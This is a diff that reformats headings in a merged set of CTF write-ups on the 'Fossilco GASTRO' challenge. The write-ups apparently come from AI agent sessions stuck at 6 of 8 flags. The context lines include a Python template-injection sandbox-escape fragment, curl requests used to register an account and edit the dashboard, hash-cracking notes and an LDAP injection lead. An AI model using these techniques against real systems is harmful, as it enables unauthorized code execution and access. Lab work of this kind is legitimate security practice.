@@ -6,9 +6,6 @@ tags = ["active-directory", "agent-slop", "forensics", "partial", "web"]
 model = "Sonnet (default)"
 draft = false
 +++
-
-# Fossilco (Topic 59114)
-
 Status: **PARTIAL** — 6/8 sub-flags captured
 
 ## Context
@@ -42,7 +39,7 @@ _Preserved from pre-standardization writeup(s). May contain duplicate context._
 
 ### From `59114-fossilco.md`
 
-# Fossilco (Topic 59114)
+## Fossilco (Topic 59114)
 
 Status: **PARTIAL** — 6/8 sub-flags captured
 
@@ -63,7 +60,7 @@ Status: **PARTIAL** — 6/8 sub-flags captured
 
 ### From `59114-ARTIFACTS.md`
 
-# Fossilco GASTRO (59114) - Challenge Artifacts & Evidence
+## Fossilco GASTRO (59114) - Challenge Artifacts & Evidence
 
 ## Challenge Location
 - **Endpoint**: http://gastro.fossil.co.ctf (WireGuard VPN required)
@@ -430,7 +427,7 @@ Submit flag to CTF scoring system via web interface
 
 ### From `59114-fossilco-7-8-opus-coach.md`
 
-# Fossilco 7-8/8 — Opus coach session (2026-05-16 ~16:00 EDT)
+## Fossilco 7-8/8 — Opus coach session (2026-05-16 ~16:00 EDT)
 
 ## Outcome
 **STUCK** — confirmed STUCK previously declared at flag 6/8 still holds. No new flag found.
@@ -481,7 +478,7 @@ The SUSPICIOUS.md pre-flight scan flagged 3352 PI-pattern hits, all in impacket 
 
 ### From `59114-fossilco-7-8.md`
 
-# Fossilco 7-8/8 attempt — 2026-05-16 (post-VPN restored)
+## Fossilco 7-8/8 attempt — 2026-05-16 (post-VPN restored)
 
 ## Status
 - Confirmed: **6/8 flag = `FLAG-04da3c7ece62a86607a3484970998683`** (DUP per wrapper). Stored at `MGMT$ C:\flag.txt`.
@@ -571,7 +568,7 @@ Recommend operator either: (a) re-crack `hashes.txt` with a fresh wordlist + rul
 
 ### From `59114-fossilco-gastro.md`
 
-# Fossilco GASTRO Challenge (59114) - Writeup
+## Fossilco GASTRO Challenge (59114) - Writeup
 
 **Challenge**: Legacy power plant monitoring system (Gastro Control Panel)  
 **Endpoint**: http://gastro.fossil.co.ctf (via WireGuard)  
@@ -609,7 +606,7 @@ The application allows free user registration without email verification. Defaul
 These can be cracked or authentication can be bypassed by creating a new account:
 
 ```bash
-# Register new user
+## Register new user
 POST /register
 email=attacker%40example.com&password=password123
 ```
@@ -674,13 +671,13 @@ pre= "".__class__.__mro__[1].__subclasses__()[586].__init__.__globals__["__built
 ### Step 1: Create Account & Authenticate
 
 ```bash
-# Use curl or browser to register
+## Use curl or browser to register
 curl -X POST http://gastro.fossil.co.ctf/register \
   -d "email=pwner%40fossil.co.ctf&password=MyP@ssw0rd" \
   -c cookies.txt
 
-# Or login if using known hash
-# Note: Default viewer password can be cracked or brute-forced
+## Or login if using known hash
+## Note: Default viewer password can be cracked or brute-forced
 ```
 
 ### Step 2: Access Custom Dashboard Edit
@@ -842,7 +839,7 @@ curl -X POST http://gastro.fossil.co.ctf/custom-dashboard/edit \
 
 ### From `59114-fossilco.md`
 
-# 59114 Fossilco - LDAP injection follow-up attempt (2026-05-16)
+## 59114 Fossilco - LDAP injection follow-up attempt (2026-05-16)
 
 ## Premise from coach
 Askgod 6/8 message said "LDAP injection is not just for auth bypass" - prior agents
